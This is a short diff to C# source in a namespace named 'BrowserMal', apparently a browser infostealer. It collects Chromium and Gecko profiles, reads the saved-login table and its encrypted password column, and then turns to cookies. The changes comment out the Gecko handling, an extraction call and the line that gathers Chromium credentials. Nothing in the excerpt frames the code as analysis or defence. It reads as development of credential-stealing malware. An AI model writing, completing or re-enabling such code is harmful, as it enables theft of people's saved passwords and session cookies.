@@ -21,9 +21,9 @@ namespace BrowserMal
             List<BrowserModel> browsersGecko = geckoBrowserManager.GetBrowsers();
 
             Chromium(ref browsersChromium);
-            Gecko(ref browsersGecko);
+            //Gecko(ref browsersGecko);
 
-            Extration();
+            //Extration();
 
             if (string.IsNullOrEmpty(output))
             {
@@ -57,7 +57,7 @@ namespace BrowserMal
                 new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
             };
             ChromiumManager<CredentialModel> credentialsManager = new ChromiumManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
-            list.AddRange(credentialsManager.Init(ref browsers, ChromiumUtil.LOGIN_DATA));
+            //list.AddRange(credentialsManager.Init(ref browsers, ChromiumUtil.LOGIN_DATA));
 
             // get cookies
             List<ColumnModel> cookiesColumns = new List<ColumnModel>
